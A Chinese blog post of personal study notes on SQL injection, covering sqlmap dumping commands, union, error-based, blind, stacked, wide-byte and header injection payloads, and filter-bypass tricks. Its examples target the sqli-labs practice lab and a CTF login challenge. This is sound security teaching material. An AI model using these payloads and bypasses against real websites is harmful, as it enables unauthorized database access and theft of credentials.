---
title: sql注入的一些基操
date: 2020-12-30 20:19:04
author: Na0H
tags:	
- 学习笔记
categories:
- 学习笔记
excerpt: sql注入！
description: sql注入！
---

<!-- more -->

## 前言

第一次写博客0.0，梳理也记录一下自己学习的知识点，也方便日后复习叭。
如有错漏还请不吝指正ya
一些前置知识：[Sqli-labs之sql注入基础知识](https://www.cnblogs.com/backlion/p/7344548.html)
	

## sql注入原理

 - sql 注入：即通过把SQL命令插入到Web表单递交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令。


 - sql注入漏洞的产生条件：

   1. 参数用户可控：前端传给后端的参数内容时用户可以控制的
   2. 参数会被带入数据库查询：传入的参数会拼接到sql语句，并且带入数据库查询。

 - 一满足以上两条件的PHP语句：

   > $query = "SELECT * FROM users WHERE id = $_GET[ 'id' ] ";

(个人理解sql注入就是将要注入的sql命令置于表单查询的变量中，找到该变量的闭合方式将其闭合起来，从而使得注入的sql命令独立于查询变量之外，达到让注入的sql命令生效的目的。)

## 工具

 - **手动注入**：hackbar、burpsuite等等
 - **sqlmap**（像盲注这种比较累的还是sqlmap方便，对盲注理解原理和方法后有工具提升效率还是不错滴）

> sqlmap -h 	#查看相关参数 
> sqlmap -u 目标网址 		——判断网站数据库类型 
> sqlmap -u 目标网址 --dbs	——查看存在的数据库 
> sqlmap -u 目标网址 --tables -D 数据库名	——查看指定数据库中存在的表 
> sqlmap -u 目标网址 --columns -T 表名 -D 数据库名	——获取表中的字段
> sqlmap -u 目标网址 --dump -C 字段名称 -T 表名 -D 数据库名	——查看表里存储的内容
> --fresh-queries 	 ——清楚缓存，直接加在命令末尾即可（在sqlmap扫一遍之后为了快捷会将数据缓存起来，有时候网站更新了数据但使用sqlmap得到的仍是未更新的数据，这时候就可以用这个命令清除缓存)


> 可利用sqkmap中的--technique选项指定注入方式。如下：
> B : 基于Boolean的盲注（Boolean based blind）
> Q : 内联查询（Inline queries）
> T : 基于时间的盲注（time based blind）
> U : 基于联合查询（Union query based）
> E : 基于错误（error based）
> S : 栈查询（stack queries）

>以下摘自：[Sqlmap命令详解](https://www.cnblogs.com/insane-Mr-Li/p/10150165.html)
>cookie注入：sqlmap.py -u 注入点 --cookie "参数" --tables --level 2
>POST登录框注入：sqlmap.py -r 从文件读取数据 -p 指定的参数 --tables
>sqlmap.py -u 登录的地址 --forms 自动判断注入
>sqlmap.py -u 登录的地址 --data "指定参数"

## 页面请求方式与注释

### 请求方式：GET和POST

 - #### GET请求

url传达参数
提交的信息会显示在url中
可以在url中进行sql注入

 - #### POST请求

提交的信息不会回显在url中，安全性相对更高，可以抓包或者利用插件修改post提交的信息
表单提交
通常有框框，常见比如登陆页面的账号框密码框啥的.
可以在框框里注入
也可以使用hackbar中的enable post或者burpsuite抓包。

 1. #### hackbar

用的是google chrome 的这款hackbar，UI界面挺简洁的（免费）![](https://i.loli.net/2021/02/13/n4gqkmaNVLlxdjy.png)

![](https://i.loli.net/2021/02/13/vexmbfJIXCR67g1.png)
不过使用时要注意
在注sqli-labs靶场的时候不删除选中的这一段会报错（还不明白为什么），就需要将图中蓝色这一段(submit=Subimt)删去再execute。
burpsubite中保持原样即可

2. #### burp suite

先抓包，丢去repeater，注入
![](https://i.loli.net/2021/02/13/87JTt2GvwUOoaLH.png)

### 注释方式：#或--+

 - sql中的注释符为 `-- (空格)` 和 `#` 以及 `/* */` 
   (多行注释 `/**/`为成对匹配，将 `/*` 和 `*/` 中的内容注释掉，可在注入时用于绕过过滤规则)
    `-- (空格)` ： sql中规定：--其后必须跟空格
    (如果不加空格，-- 会和系统自动生成的单引号连接在一起，被判定为关键词，无法注释掉系统自动生成的单引号)

 - 使用`--+`的原因：
   在url中输入空格按回车，传输过程中**末端**的空格会被忽略，**其余**空格会被转义为%20。
    而 + 会被解释为空格，因此在GET请求注入时使用`--+`或者`--%20`代替`--(空格)`


 - GET请求时`#`无法正常使用，用 `--+`或者`%23`(#的url编码)
   原因：url中无法显示某些特殊符号。在url中#表示书签，对服务端无用，导致HTTP请求中不包含# 。
   (在url中输入#按回车就能发现#没有转换为urlencode编码格式)
 - url编码：% + 对应ASCII码

### 内联注释

形如： `/*！code   */`
内联注释可用于整个sql语句中，执行sql注入
内联注释会将 `/*！code   */`中的code注释掉，但仍执行code代表的命令

> index.php?id=1 /*! UNION*/ /*! SELECT*/ 1,2,3

*内联注释可以用来进行绕过注入*

## 注入思路

> 1.注入点
> 2.判断字段数
> 3.爆回显位
> 4.爆段
> 5.爆库
> 6.爆表
> 7.爆列
> 8.爆值

偶尔爆出的信息是经过加密的，可以到解密网站解密：
如：
<a href="https://www.cmd5.org">md5 decrypt</a>
[pmd5](https://pmd5.com/)
[各种加解密](http://tools.bugscaner.com/encodeanddecode/)

### 判断注入点及其闭合方式

找传参点，再判断是否有sql注入漏洞

#### 注入点

注入点大致可分为数字型和字符型
后端查找代码:

 - 数字型： `SELECT 列 FROM 表 WHERE  id=1` （数字型列=值）
 - 字符型： `SELECT 列 FROM 表 WHERE  id='1'`（字符型列=’值’）
 - 还有一种搜索型注入我理解不深，可以看一下这篇：[SQL注入-搜索型输入](https://blog.csdn.net/weixin_42277564/article/details/94401484)

#### 闭合方式

- 数字型不存在闭合方式，后端代码不对其参数处理，而是直接赋值给变量。

> eg: ---(sqli-labs)--Less2
> ?id=1	正常回显
> ?id=-1	变化(构造不可能的值如 -1、999999999)
> ?id=1 and 1=1	正常回显
> ?id=1 and 1=2	变化（此时基本课判断存在数字型注入点）
> ?id=1 or 1=1 正常回显


- 字符型的闭合方式很多
  例如 `‘ ’`、 `“ ”`、`( )`，还有它们的变种组合 `(' ')`、 `(" ")` 等等

> eg:                              ---(sqli-labs)--Less1
> ?id=1,正常回显
> ?id=1 and 1=1 正常回显 
> ?id=1 and 1=2 正常回显
> -------------------判断为非数字型注入 
> ?id=1’		变化/报错 
> ?id=1’ --+		正常回显
> -------------------判断为字符型注入。闭合方式为单引号’ ’
> ---------------------------对不同闭合类型将 ' 改为对应闭合符号即可


### 判断字段数及回显位

#### 判断字段数

> eg:
> ?id=1' order by 1 --+
> ?id=1' order by 2 --+
> ?id=1' order by 3 --+
> ![](https://i.loli.net/2021/02/13/PYcbg56GCvoNQ2H.png)
> ?id=1' order by 4 --+
> ![](https://i.loli.net/2021/02/13/sV8G3k9mhRiIEaX.png)

说明字段数为3，

#### 判断回显位

> eg: 
> ?id=-1’ union select 1,2,3 --+
> ![](https://i.loli.net/2021/02/13/V9R1TWPtJSKjeNx.png)

2,3为回显位，因此在2、3的位置插入语句即可。

> eg:
>
> ```mysql
> ?id=-1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() --+
> ```
>
> 

####   一库三表四字段

很多教程讲的很详细，这里不做赘述，挂个当时记的结构图
![](https://i.loli.net/2021/02/13/VMmBU5JvkuAH9Oe.jpg)
select schema_name from information_schema.schemata
select table_name from information_schema.tables where table_schema='xxx'
select column_name from information_schema.columns where table_name='xxx'
select group_concat(xxx) from xxx

## 各种注入

### union联合查询

 - 适用：`页面有回显位的情况`

 - 当访问id=1 union selecet 1,2,3时，执行的sql语句为： ```sql select * from users
   where 'id'=1 union select 1,2,3 ```

   此时的sql语句可分为两条：

     1. `select * from users where 'id'=1`
     2. `union select 1,2,3` 

    	 此时利用第二条语句(Union查询)即可获取数据库中的数据

eg:sqli-labs------Less1  

```sql
1--判断注入点类型 
?id=1			#正常回显 
?id=1 and 1=1 	#正常回显 
?id=1 and 1=2 	#正常回显
-------------------非数字型注入 
?id=1’,报错 ?id=1’ --+	#正常回显
-------------------字符型注入。闭合方式为单引号’ ’
```


```sql
2--爆段  
?id=1' or 1=1 order by 1 --+ #正常 
?id=1' or 1=1 order by 2 --+ #正常 
?id=1' or 1=1 order by 3 --+ #空白 
?id=1' or 1=1 order by 4 --+ #报错(Unknow column ‘4’ in ‘order clause’)

或 

从 ?id=-1' union select 1--+		#报错 
到 ?id=-1' union select 1,2,3 --+  	#正常回显即可
```


```sql
3--爆数据库 
?id=-1' union select 1,2,database()--+ 得到数据库名security
```


```sql
4--爆表 
?id=-1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() --+ 
#得到表名：emails,referers,uagents,users
```


```sql
5--爆列名 
?id=-1' union select 1,2,group_concat(column_name) from information_schema.columns where table_name='users' --+ 
得到列名 avatar,failed_login,....,USER,id,password,username
```


```sql
6-爆值 ?id=-1' union select 1,2,group_concat(username,0x2b,password) from users --+ 
得到：（+分隔账号密码） Dumb+Dumb,I-kill-you+Angelina,.....
```

### 报错注入

 - 适用：`页面中会显示SQL的报错信息 `
   但一般情况下SQL的报错信息是不会显示在页面中的，必须在在php.ini 进行配置`display_errors=On`   *--(开启PHP错误回显)*  

 - SQL报错信息被显示在页面上  
   (即通过 `echo mysqli_error($con)` 将错误信息输出到页面)

#### floor函数

```sql
' and (select count(*) from information_schema.tables group by concat((查询语句),floor(rand(0)*2))) --+
```

#### updataxml函数

```sql
' and (select updatexml(1,concat(0x7e,(查询语句),0x7e),1))--+
```

#### extractvalue函数

```sql
' and (select extractvalue(1,concat(0x7e,(查询语句),0x7e)))--+
```

### bool盲注

 - 适用条件： 
   `无查询结果、报错信息的回显，但页面会根据查询结果的正确与否变化的情况`
  - 真实渗透中手动盲注与sqlmap比起来效率太低，实战中还是使用sqlmap，但一定要熟知原理


-常用函数：

```sql
截取
substr()、substring()、id():
substring()和mid()的用法和substr()一样，但是mid()是为了向下兼容VB6.0，已经过时，以上的几个函数的pos都是从1开始的
eg:
substr(string, pos, len): 从pos开始，取长度为len的子串
substr(string, pos): 从pos开始，取到string的最后

left()和right():
left(string, len)和right(string, len): 分别是从左或从右取string中长度为len的子串
limit
limit pos len: 在返回项中从pos开始去len个返回值，pos的从0开始

ascii()和char()和ord():
ascii(char): 把char这个字符转为ascii码
char(ascii_int): 和ascii()的作用相反，将ascii码转字符
ord(str): 如果字符串str句首是单字节返回与ascii()函数返回的相同值。
```

 eg:sqli-labs Less5

 - （正确则回显，不正确则无回显）
 - （可使用如left((select database()),1)<'t'  这样的比较二分查找方法快速爆破）


--爆库：

```sql
?id=1' and left((select database()),1)='s' --+
?id=1' and left((select database()),8)='security' --+
```

--爆表

```sql
?id=1' and left((select table_name from information_schema.tables where table_schema=database() limit 3,1),5)='users' --+
```

--爆列名

```sql
?id=1' and left((select column_name from information_schema.columns where table_name='users' limit 4,1),8)='password' --+
```

```sql
?id=1' and left((select column_name from information_schema.columns where table_name='users' limit 12,1),8)='username' --+
```

--爆字段

```sql
?id=1' and length((select password from users order by id limit 0,1))=8 --+(长度)
?id=1' and left((select password from users order by id limit 0,1),4)='dumb' --+
?id=1' and left((select username from users order by id limit 0,1),4)='dumb' --+
```

```sql
?id=1' and length((select password from users order by id limit 1,1))=10 --+(长度)
?id=1' and left((select username from users order by id limit 1,1),8)='angelina  ' --+
```

### 时间盲注

 - 适用：
   `无查询结果、报错信息的回显，页面正常显示的情况`
 - 时间盲注即利用`sleep()`或`benchmark()`等函数使得命令执行时间变长，常与`if(expr1,expr2,expr3)`搭配使用猜解数据库
 - `if(expr1,expr2,expr3)`含义：`exp1`为**TRUE** 则 if()返回值为`expr2`,否则返回值为`expr3`. ——即 (1真返回2，1假返回3).
 - eg判断数据库库名长度语句为：

```sql
 if (length ( database() ) >1 , sleep(5) , 1)
```

### 堆叠注入

 - 堆叠注入的使用条件十分有限，可能受到API、数据库引擎或者权限的限制。
 - 在堆叠注入页面中，程序会获取GET参数ID，并利用PDO的方式查询数据，ID会被拼接到查询语句当中，导致PDO没起到预编译的效果----导致程序存在sql注入漏洞
 - *只有当调用数据库函数支持执行多条sql语句时才能够使用，利用mysqli_multi_query()函数就支持多条sql语句同时执行，但实际情况中，如PHP为了防止sql注入机制，往往使用调用数据库的函数是mysqli_ query()函数，其只能执行一条语句，分号后面的内容将不会被执行*
 - 堆叠查询可以执行多条语句，多语句之间以分号隔开。堆叠注入就是利用此特点，在第二条sql语句中构造要注入的语句。
 - eg：

```sql
';select if(substr(user(),1,1)='r',sleep(3),1) --+
```

 - 这里的第二条语句(select if(substr(user(),1,1)='r',sleep(3),1) --+)即为时间盲注的语句
 - 使用PDO执行SQL语句时，可以执行多条语句，不过这样通常不能直接得到注入结果，因为PDO只会返回第一条SQL语句执行的结果，所以在第二条语句中可以用update更新数据或者使用时间盲注获取数据

### 二次注入

 - 适用`
   注入漏洞页面与查询页面不在同一页面`

 - 比方说1.php可以插入sql语句，2.php可以通过参数ID读取用户名和用户信息。
 - 思路大体就是在多个页面中找到那个过滤措施不严密的网站作为突破口，从而达成自己的注入目的。

### 宽字节注入（GBK双字节绕过）

 - 适用：
   `单引号被反斜杠转义，且数据库编码为GBK（PHP中通过iconv()进行编码转换也可能存在宽字节字符注入）`

 - 宽字节格式：先加 `%df` 再加`'`
 - 原理：
   `反斜杠编码是%5c，GBK编码中%df%5c表示为一个繁体字’運‘，从而绕过反斜杠。（不仅仅可以适用%df%5c,凡是能构造成GBK双字节的都能产生这样的绕过效果）`
 - 比如输入的id被 `'`包围，输入`id=1'`，程序不报错，但会多出一个反斜杠(`id= '1\''`)，此时输入的单引号被反斜杠转义，从而导致输入的单引号无法形成闭合。通常这种情况下此处是不存在sql注入漏洞的。
   但数据库查询前执行了SET NAMES ‘GBK’语句，会将编码设置为宽字节GBK。造成此处的宽字节漏洞。

### cookie注入

 - 适用：
   `URL中没有GET参数，但页面返回正常。抓包发现cookie中存在i类似d=1的参数。(参数名不一定是id，也可能是uname等等)`
 - 原理：
   `程序通过$_COOKIE获取参数ID，然后将ID拼接到select语句中查询。若不对cookie中的参数id进行过滤就会存在sql注入漏洞。`
 - 和基于GET的url注入套路相似。

### User-Agent

 - 适用：
   `参数出现在User-Agent信息中。`
 - 将构造的语句放在User-Agent信息的末尾即可

### XFF注入

 - 适用：
   `参数出现在X-Forwarded-for中。(简称XFF头，代表客户端的真实IP，修改这个值可以伪造客户端IP)`
 - 检测及利用：
   `将XFF设置为127.0.0.1，访问该URL页面正常，改为127.0.0.1’ 返回报错信息则存在注入点。`
   ` union联合查询注入即可。`

### base64注入

 - 适用：
   `观察请求数据中有出现大小写字母+数字的组合乱码。`
 - 利用：
   `注入时先将原来的base64解码，与构造的语句拼接，一起进行base64编码后将数据发送即可`
 - 原理：
   `后端会利用函数base64_decode()对参数ID进行base64解码，在将解码后的id信息拼接到select语句查询。因为程序未对解码后的id进行过滤，因此此处存在sql注入漏洞。`

## SQL注入绕过技术

 - 在代码层的防御一般不外乎两种，一是反斜杠转义，二是replace将关键字替换成空字节

### 大小写绕过注入

 - 适用：
   `可能存在and、select、union这样的关键字被替换的情况，则可以采用大小写绕过进行注入`
 - eg:`and->And、aNd、AND等等`

### 双写绕过注入

 - 适用情况同上
 - eg:`and->anandd`、`or->oorr` 等等

### 编码绕过注入

 - 只需判断被过滤的关键字，并经过两次URL全编码即可。其余与union注入一样。
 - 服务器会字段对URL进行一次编码，所以要把关键词编码两次。
   注：此处URL编码要选择全编码

 - 原理：
   `服务器会进行一次编码，但后续的进程如服务器、程序函数等等解码并不统一，攻击者就是利用此处的不统一将关键字在过滤出进行编码绕过，再在随后的解码步骤解码还原。`：![图片源自网易Web安全工程师课程，侵删](https://i.loli.net/2021/02/13/iWvGmyjHk5Y27UC.jpg)

### 内联注释绕过注入

 - 将被过滤的关键字用`/*！*/`包起来即可。
 - 原理：
   在mysql中，内联注释`/*！code */`中的code虽然被注释了但仍能发挥其在语句中的作用。

### 特殊符号绕过

除了以上这些，有些waf也会过滤一些特殊符号：空格、=、<、>等等
这里的bypass方法实际就是寻找等效的命令，或者用特殊的姿势实现绕过

#### 空格过滤绕过注入

- 适用于空格被置换为空的情况，除了sql注入，很多地方都有这样的WAF
- bypass：

```sql
()
/**/
回车(url编码为：%0a)
`(反引号)
tap
双空格
```

#### or and xor not过滤绕过

- bypass:

```sql
and = &&
or = ||
xor = | # 异或
not = !
```

#### =号过滤绕过

- bypass: 

```sql
不加通配符`%`的`like`和`relike`
`!<>`
利用关键字`regexp`进行正则表达匹配
利用比较函数`strcmp(str1,str2)`
```

- 不加通配符`%`的`like`和`relike` (效果等同于=)

不加通配符`%`的`like`：

```sql
mysql> select * from table1 where id like 1;
+----+----------+----------+
| id | name     | password |
+----+----------+----------+
|  1 | test1    | pass1    |
+----+----------+----------+
```

添加通配符`%`的`like`：

```sql
mysql> select * from table1 where name like "test%";
+----+----------+----------+
| id | name     | password |
+----+----------+----------+
|  1 | test1    | pass1    |
|  3 | test3    | pass3    |
+----+----------+----------+
```

- `!<>` 
  `<>`相当于`!=`，所有`!<>`就相当于`=`

#### <>过滤绕过

```sql
`greatest(n1, n2,…)`:返回n中的最大值
`least(n1,n2,…)`:返回n中的最小值
`strcmp(str1,str2)`:若所有的字符串均相同，则返回STRCMP()，若根据当前分类次序，第一个参数小于第二个，则返回 -1，其它情况返回 1
关键字`in`
```


#### 引号(单、双)过滤绕过

```sql
引号连同引号内内容一起转为十六进制
宽字节绕过：
    # 过滤单引号时
    %bf%27 %df%27 %aa%27
%df\’ = %df%5c%27=縗’
```

#### ，过滤绕过

- ，被过滤会影响许多函数的使用,特别是盲注需要用到很多函数都需要逗号
- bypass：

```sql
from pos for len
join
关键字 like(提取子串的函数中的逗号 select ascii(substr(user(),1,1))=114; => select user() like "r%")
关键字 offset(limit 1,2 => limit 1 offset 2)
```

eg:

```sql
from pos for len 代替 ，
原本的substr函数：           select substr("string",1,3); 
用from pos for len代替逗号： select substr("string" from 1 for 3);
```

```sql
原语句：union select 1,2,3
join 代替 ，：select * from users  union select * from (select 1)a join (select 2)b join(select 3)c;
```


#### 函数绕过

实质是找等价函数

```sql
sleep() => benchmark()
ascii() => ord()、hex()、bin() #不一定用ascii码，也可转为其他进制；但ord()于ascii()对中文处理不同
group_concat() => concat_ws()
user() => @@user  #全局变量
datadir => @@datadir #全局变量
```



## 一个关于联合查询的补充

最近刷题刷到的新知识，题目是[GXYCTF2019]BabySQli

- 知识点：在联合查询时，若查找的数据不存在，联合查询就会构造一个虚拟的数据：

![](https://i.loli.net/2021/03/05/XIoVNr9isYU35uT.png)

在search.php页面查看源代码，将其base32解码 -》base64解码即得查询语句：
`select * from user where username = '$name'`
![](https://i.loli.net/2021/03/05/xUTpE7qboR1mSyl.png)

题目中拥有三个字段数：`1' union select 1,2,3--+`；

且当输入存在的用户如admin时，回显wrong pass；输入不存在的用户则回显wrong user；尝试注入则回显don’t hack me
由此：后端将用户名和密码分开检测，先检测用户名再检测密码

将admin拼入字段数中查找，`1' union select 1,'admin',3--+`；回显wrong pass；说明username在第2列
猜测为id，username，passwd；

利用联合查询会构造虚拟数据的原理，使得表中生成一个用户名为admin，密码由我们自己输入的数据：
`name=1' union select 1,'admin','e10adc3949ba59abbe56e057f20f883e'--+&pw=123456`
ps：md5(123456)=e10adc3949ba59abbe56e057f20f883e；因过滤无法使用md5()，故直接传入其md5值

这时候pw传入的密码与表中数据成功匹配，即可获得flag